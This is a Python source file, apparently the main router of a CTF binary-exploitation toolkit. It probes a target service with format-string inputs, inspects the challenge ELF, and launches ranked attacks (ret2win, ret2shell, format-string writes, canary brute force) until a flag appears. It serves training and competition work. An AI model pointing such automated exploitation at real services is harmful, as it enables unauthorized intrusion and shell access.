        print(f"  {ap_cmd}--recon --probe")
        print(f"  {ap_cmd}--mode fmt --goal fmt-leak")
        print(f"  {ap_cmd}--goal ret2win --offset NN --addr 0xWIN   # NN/0xWIN from elftool")


def print_triage(args, cands, elf, banner, fmt_yes=None, src=None):
    print(f"\n=== triage {args.host}:{args.port} ===")
    if args.binary and elf:
        print(f"[*] {args.binary}: {elf.get('bits')}-bit pie={elf.get('pie')} nx={elf.get('nx')} "
              f"canary={elf.get('canary')}")
    if banner:
        first = banner.decode("latin-1", "replace").strip().splitlines()[:2]
        print("[*] banner: " + " | ".join(line.strip() for line in first))
    print(targeted_write_hint(args, elf, fmt_yes, src or {}), end="")
    print(f"[*] {len(cands)} candidate shape(s), best first:\n")
    for i, c in enumerate(cands, 1):
        print(f"  {i}. {c['shape']}")
        print(f"     why: {c['why']}")
        if c.get("shell"):
            print(f"     cmd: python3 {tool('verify.py')} --binary {args.binary} "
                  f"--host {args.host} --port {args.port}")
            print(f"          python3 {tool('ret2shell.py')} --binary {args.binary} "
                  f"--host {args.host} --port {args.port} [--shift=-0xNN]")
        else:
            # shlex.join, not " ".join: an argument with spaces or `;` in it (a shell command
            # for --cmd, a --talk step) must come out QUOTED, or pasting the line breaks it -
            # and runs the tail of it in your own shell.
            print("     cmd: " + shlex.join(c["cmd"]))
        print()
    print("[*] add --run to execute these in order (stops at the first solve).")


# ---------------------------------------------------------------- main
def main():
    ap = argparse.ArgumentParser(description="thin router over the toolkit")
    ap.add_argument("host")
    ap.add_argument("port", type=int)
    ap.add_argument("--binary", help="the challenge ELF, if they gave you one; "
                    "unlocks offsets, win symbols, gadgets and protection detection")
    ap.add_argument("--source", help="the challenge .c, if they gave you one; "
                    "unlocks magic guard values and strcmp literals")
    ap.add_argument("--run", action="store_true", help="execute the ranked candidates")
    ap.add_argument("--timeout", type=float, default=180.0, help="global budget in seconds")
    ap.add_argument("--per-candidate", type=float, default=60.0, help="cap per candidate")
    ap.add_argument("--notes", action="append", default=[], metavar="FILE",
                    help="a text file with whatever the PAPER says (sizes, addresses, codes, "
                         "passwords, sums). Read by notes.py; go.py is the no-flags way in")
    ap.add_argument("--hint", action="append", default=[], metavar="TEXT",
                    help="one thing the paper says, inline: --hint 'code is 0x1337'")
    ap.add_argument("--flag-regex", help="custom flag pattern, forwarded to auto_pwn "
                    "(use when the flag is unlabelled, e.g. 'ehCTF\\{[^}]+\\}')")
    ap.add_argument("--transcript", default="solve_transcript.log",
                    help="where the full byte-level log of every attempt is written")
    args = ap.parse_args()

    for path, what in ((args.binary, "--binary"), (args.source, "--source")):
        if path and not os.path.exists(path):
            print(f"[!] {what} not found: {path}")
            return 4

    # Swapping --binary and --source is the easiest mistake to make, and the symptom is a
    # baffling "no shape matched" rather than anything about files. Check the magic bytes.
    def is_elf(path):
        try:
            with open(path, "rb") as fh:
                return fh.read(4) == b"\x7fELF"
        except OSError:
            return False

    if args.binary and not is_elf(args.binary):
        print(f"[!] --binary {args.binary} is NOT an ELF executable.")
        if args.binary.endswith((".c", ".cpp", ".h", ".txt", ".py")):
            print(f"[!] that looks like source code. Use:  --source {args.binary}")
        else:
            print("[!] --binary wants the compiled program (what `file` calls 'ELF').")
        return 4
    if args.source and is_elf(args.source):
        print(f"[!] --source {args.source} is a compiled ELF, not source code.")
        print(f"[!] use:  --binary {args.source}")
        return 4

    deadline = time.time() + args.timeout
    tr = Transcript(args.transcript)
    tr.note(f"target {args.host}:{args.port} binary={args.binary} source={args.source} run={args.run}")
    try:
        # 00. What does the paper say? Parsed once, shown, and handed to every child tool
        # through the environment - they read it where they already collect "values seen
        # on the wire", so no tool needs a flag for it.
        if args.notes or args.hint:
            import json
            import notes as _notes
            text = "\n".join(args.hint) + "\n"
            for nf in args.notes:
                try:
                    text += open(nf, errors="replace").read() + "\n"
                except OSError as exc:
                    print(f"[!] cannot read notes file {nf}: {exc}")
            facts = _notes.parse(text)
            os.environ["CTF_HINTS"] = json.dumps(facts)
            # Words that name the TECHNIQUE. They decide nothing on their own - only which
            # of two readings of an address is tried first.
            os.environ["CTF_NOTE_WORDS"] = " ".join(sorted(set(re.findall(
                r"jmp\s*[er]sp|jump_to_stack|shellcode|executable|execstack|nop\s*sled|trampoline", text.lower()))))
            print("[*] from your notes I read:")
            print("\n".join(_notes.describe(facts)))
            if facts:
                print("[*] if any line above is WRONG, fix the notes and run again - these are used as given.")

        # 0. Can the binary be read at all? The analysis shells out to objdump; without it
        # nothing crashes - offsets, guards, gadgets and win() arguments are simply not
        # found, and four of five clones "fail" after two minutes with no word about why.
        import shutil
        missing = [p for p in ("objdump", "readelf", "strings") if not shutil.which(p)]
        if missing and args.binary:
            print("=" * 78)
            print(f"[!] NOT INSTALLED: {', '.join(missing)}. Without "
                  f"{'objdump' if 'objdump' in missing else missing[0]} the binary cannot be analysed:")
            print("[!] no offsets, no guard values, no gadgets. Most techniques will fail for")
            print("[!] that reason and NOT because the challenge is hard.")
            print("[!] Fix:  sudo apt install binutils        (then: python3 compat.py)")
            print("[!] Carrying on with what needs no disassembly (format-string reads, sprays).")
            print("=" * 78)
            DIAGNOSES.append(f"[!] DIAGNOSIS: {', '.join(missing)} not installed - the binary was never "
                             f"analysed. Install binutils and run this again before concluding anything.")

        # 1. banner FIRST - refuse a menu or a silent service before sending anything
        _t0 = time.time()
        banner, err = read_banner(args.host, args.port)
        # One connection's real cost. A rate-limited service makes some techniques
        # arithmetically impossible, and the user should hear that rather than watch a
        # budget drain: slowcanary32 costs 1.2s per connect, so a canary brute is ~21
        # minutes.
        conn_cost = max(BANNER_COST.get("first_byte", time.time() - _t0), 0.01)
        LINK["cost"] = conn_cost
        # Caps were tuned on loopback, where a connection costs ~0.1 s. On a slower link the
        # same technique needs proportionally longer, so each candidate's cap stretches
        # with the measured cost (up to 3x). The GLOBAL --timeout does not: that is yours.
        slow = min(3.0, max(1.0, conn_cost / 0.25))
        if conn_cost > 0.5:
            print(f"[*] this service costs {conn_cost:.2f}s per connection; techniques "
                  f"that need many tries will be slow")
        if slow > 1.2:
            print(f"[*] slow link: each technique gets {slow:.1f}x its usual time. If the run "
                  f"ends with techniques untried, re-run with --timeout {int(args.timeout * slow) + 60}")
        tr.note(f"[banner] {err or repr(banner[:200])}")
        # If a gate answers first, judge the banner that comes AFTER it.
        past = banner_past_gates(args.host, args.port)
        if past and len(past) > len(banner or b""):
            print(f"[*] a live gate hides part of the banner; reading past it "
                  f"({len(past) - len(banner or b'')} more bytes)")
            tr.note(f"[banner past gates] {past[:300]!r}")
            banner = past
        reason = menu_reason(banner)
        if reason == "could not connect":
            # A single failed banner read is not proof the host is down - under load a
            # reachable service drops one connection. Re-probe before giving up, or a
            # transient blip aborts --run and breaks the never-decline guarantee.
            for _ in range(3):
                time.sleep(0.8)
                banner, err = read_banner(args.host, args.port)
                if menu_reason(banner) != "could not connect":
                    break
            reason = menu_reason(banner)
            tr.note(f"[banner retry] {err or repr((banner or b'')[:120])}")
        if reason == "could not connect":
            print(f"\n[!] nothing is listening on {args.host}:{args.port}")
            print("[!] check, in this order:")
            print("      1. is the port right?  (the challenge page / nc command)")
            print("      2. is the host right?  (copy-paste it, do not retype)")
            print("      3. are you on the lab network or VPN?")
            print(f"      4. try by hand:  nc {args.host} {args.port}")
            return 3
        if reason:
            menu_detected = True
            print(f"\n[*] {reason}")
            print(suggest_talk(args, banner))
            if not args.run:
                print("\n[*] triage only: add --run and it will walk the menu options itself.")
                print_template(args, reason, {}, {}, banner, [])
                return 3
            print("[*] --run: walking the menu options rather than stopping.")
        else:
            menu_detected = False

        # 2. static facts
        elf = elf_facts(args.binary, tr, min(20, deadline - time.time())) if args.binary else {}
        src = src_facts(args.source, tr, min(20, deadline - time.time())) if args.source else {}

        # 3. runtime fmt probe (only now that the banner is a normal prompt)
        fmt_yes, c4, c12 = probe_fmt(args.host, args.port, tr, banner)

        # 4. guard constants (ranking only)
        # Do the notes and the binary agree? Both are still tried (the binary's own layout
        # first), but a disagreement is worth a sentence: the notes may belong to another
        # question, or the server may be running a different build from your copy.
        if args.binary and os.environ.get("CTF_HINTS"):
            try:
                import notes as _notes
                _f = _notes.load()
                said_off = [f["value"] for f in _f if f["kind"] == "offset"]
                have_off = elf.get("ret_offset_candidates") or []
                if said_off and have_off and not set(said_off) & set(have_off):
                    print(f"[!] your notes say offset {', '.join(map(str, said_off))}; this binary's own layout says "
                          f"{', '.join(map(str, have_off[:3]))}. Trying the binary's first, then the notes'.")
                said_addr = [f["value"] for f in _f if f["kind"] == "address" and f["value"] < 0xF7000000]
                have_addr = list((elf.get("win_symbols") or {}).values())
                if said_addr and have_addr and not elf.get("pie") and not set(said_addr) & set(have_addr):
                    print(f"[!] your notes give the address {', '.join(hex(a) for a in said_addr[:2])}; the win-like "
                          f"function in this binary is at {', '.join(hex(a) for a in have_addr[:2])}. Trying both.")
                    print("[!] If the server runs a DIFFERENT BUILD from your copy, the notes may be the right "
                          "ones - see RUNBOOK section 2 (verify.py).")
            except Exception as exc:
                print(f"[!] BUG while comparing notes with the binary: {type(exc).__name__}: {exc}")
        magics = magic_guards(args, elf, tr, min(20, deadline - time.time())) if (args.binary or args.source) else []

        cands = build_candidates(args, elf, src, fmt_yes, magics, banner)
        reason = low_confidence(args, elf, src, cands)

        if not args.run:
            if reason:
                print_template(args, reason, elf, src, banner, cands, fmt_yes, magics)
                return 3
            print_triage(args, cands, elf, banner, fmt_yes, src)
            return 0

        # --run always attempts. Ranked candidates first, then every other technique we
        # have; a refusal before trying anything is not an answer.
        if reason:
            told = False
            try:
                import json as _json
                told = bool(_json.loads(os.environ.get("CTF_HINTS") or "[]"))
            except ValueError:
                pass
            if told and not args.binary and not args.source:
                print("\n[*] no binary or source - but your notes give me something to work with.")
                print("[*] Trying what the notes say first, then every other technique.")
            else:
                print(f"\n[*] {reason}")
                print(f"[*] Attempting anyway: nothing was ruled IN, so every technique gets a go.")
            print(f"[*] Worst case this runs for {args.timeout:.0f}s before giving up.")
            print( "[*] Ctrl-C to stop early - on a timed paper a dead end is worth "
                   "a minute, not five.")
        seen = {tuple(c["cmd"]) for c in cands if c.get("cmd")}
        for b in battery(args, elf, arch_of(elf, src), ap_of(args)):
            if tuple(b["cmd"]) not in seen:
                cands.append(b); seen.add(tuple(b["cmd"]))
        if menu_detected:
            cands = with_menu_paths(cands, banner) + cands
        if not menu_detected:
            # ONE walk that handles a login, a safe first read, or both together.
            walked = with_prompt_path(args, cands, banner)
            # The format-string probe ran on a bare connection. If a login or a first read
            # stood in front, it tested the wrong input: probe again BEHIND the path just
            # walked, and if the bug is there, send the engine down the same path.
            replies = [r for _p, r in LAST_PATH.get("steps") or []]
            if replies and not fmt_yes:
                pre = "".join(r + "\n" for r in replies).encode("latin-1", "replace")
                r4 = send_once(args.host, args.port, b"%p.%p.%p.%p\n", pre=pre)
                r12 = send_once(args.host, args.port, b"%p." * 12 + b"\n", pre=pre)
                n4, n12 = len(set(HEX_TOKEN.findall(r4))), len(set(HEX_TOKEN.findall(r12)))
                if n12 > n4 and n12 >= 3:
                    print(f"[*] format-string bug found behind {len(replies)} prompt(s) "
                          f"(login / first read): running the engine down the same path")
                    pre_args = [x for r in replies for x in ("--pre", r)]
                    cands.insert(0, {
                        "shape": "fmt engine behind the prompts just walked",
                        "why": f"%p scaling probe is positive after {' / '.join(replies)}",
                        "cmd": [sys.executable, tool("fmtpwn.py"), args.host, str(args.port)]
                               + (["--binary", args.binary] if args.binary else [])
                               + pre_args + ["--budget", "AUTO"], "rank": (0, 0)})
            if walked and LAST_PATH.get("login"):
                # The service ACCEPTED a login. Every candidate that does not log in lands
                # on the username prompt and cannot work, so the logged-in ones go first -
                # they used to wait behind a full cap of each bare-connection attempt.
                cands = [c for c in cands if c.get("shape", "").startswith("fmt engine behind")] + walked + \
                        [c for c in cands if not c.get("shape", "").startswith("fmt engine behind")]
            elif walked:
                # Behind the hard-evidence tier (a confirmed fmt bug, an imported strcmp,
                # a derived win() argument), ahead of everything merely plausible.
                k = 0
                while k < len(cands) and cands[k].get("rank", (9, 0))[0] == 0:
                    k += 1
                cands = cands[:k] + walked + cands[k:]

        # 5. run in rank order, each capped, all under the global deadline
        for i, c in enumerate(cands, 1):
            remaining = deadline - time.time()
            if remaining <= 2:
                print(f"\n[!] global {args.timeout:.0f}s budget exhausted before candidate {i}")
                break
            # Share the remaining time across the remaining candidates. A fixed cap is
            # wrong when the list is long: on a menu-gated target the candidate count
            # multiplies by the number of options, and the right one can sit at #7 of 45.
            left = max(1, len(cands) - i + 1)
            # A brute-force shape on a rate-limited service can be arithmetically
            # impossible. Say so with the numbers, so the minutes go to another question
            # instead of draining here. The attempt still runs - it just stops being a
            # surprise when it does not finish.
            est = brute_estimate(c["shape"], conn_cost)
            if est and est[1] > remaining:
                print(f"\n[!] {c['shape']} needs about {est[0]} connections at "
                      f"{conn_cost:.2f}s each = {est[1]/60:.0f} min, but only "
                      f"{remaining/60:.1f} min of budget is left.")
                print( "[!] it cannot finish here. Either raise --timeout, or spend the "
                       "time on a different challenge - a leaked canary or a second bug "
                       "is the usual way past this.")
            budget = min(args.per_candidate * slow, remaining, max(25.0 * slow, remaining / left))
            if reason:                       # exhaustive mode: breadth beats depth
                budget = min(budget, 20.0 * slow)
            # The format engine has shown that no address can be written through this bug
            # (buffer off the stack, or PIE with one printf): another %n attempt cannot
            # land. Reads, and every non-format technique, still get their turn.
            if any("this IS a format-string bug" in d for d in DIAGNOSES) and \
                    re.search(r"fmt[- ]write", c["shape"]):
                print(f"\n=== [{i}/{len(cands)}] {c['shape']} - skipped: the diagnosis above rules out "
                      f"format-string writes here")
                continue
            print(f"\n=== [{i}/{len(cands)}] {c['shape']} ({budget:.0f}s cap) - {c['why']}")
            if c.get("shell"):
                if run_shell(args, tr, budget) == 0:
                    print(f"\n[+] SOLVED via {c['shape']}  (transcript: {args.transcript})")
                    return 0
                continue
            # A tool that paces itself is told how long it really has, so it stops cleanly
            # and reports what it tried instead of being killed mid-step with no output.
            cmd = [str(max(8, int(budget) - 3)) if x == "AUTO" else x for x in c["cmd"]]
            rc, out = run_tool(cmd, budget, tr)
            sys.stdout.write(out)
            for d in re.findall(r"^\[!\] DIAGNOSIS:.*(?:\n\[!\] (?!\d+ frame-guard).*){0,5}", out, re.M):
                if d.split("\n")[0] not in [x.split("\n")[0] for x in DIAGNOSES]:
                    DIAGNOSES.append(d)
                    if rc != 0:
                        # Said NOW, not two minutes from now at the bottom of the screen.
                        print("[!] ^ The DIAGNOSIS lines just above explain this failure. What follows are "
                              "OTHER techniques, tried for completeness - Ctrl-C if that already answers it "
                              "(it is repeated under READ THIS FIRST at the end).")
            if rc == 0:
                print(f"\n[+] SOLVED via {c['shape']}  (transcript: {args.transcript})")
                return 0
            print(f"[-] {c['shape']} did not solve (exit {rc}); falling through")

        print(f"\n[!] attempted {len(cands)} technique(s); none produced a flag. "
              f"Transcript: {args.transcript}")

        print_template(args, "every ranked candidate failed", elf, src, banner, cands, fmt_yes, magics)
        # LAST, so it is what is on screen when the run ends - the template above is long.
        if DIAGNOSES:
            print("\n" + "=" * 78)
            print("READ THIS FIRST - what the failed attempts did establish:")
            for d in DIAGNOSES:
                print(d)
            print("=" * 78)
        return 2
    except KeyboardInterrupt:
        # The tool itself says "Ctrl-C if that already answers it" - so what it learned
        # must still be on screen afterwards.
        print("\n[!] stopped by Ctrl-C. No flag so far.")
        if DIAGNOSES:
            print("\n" + "=" * 78)
            print("READ THIS FIRST - what the attempts so far did establish:")
            for d in DIAGNOSES:
                print(d)
            print("=" * 78)
        return 130
    finally:
        tr.close()


if __name__ == "__main__":
    sys.exit(main())
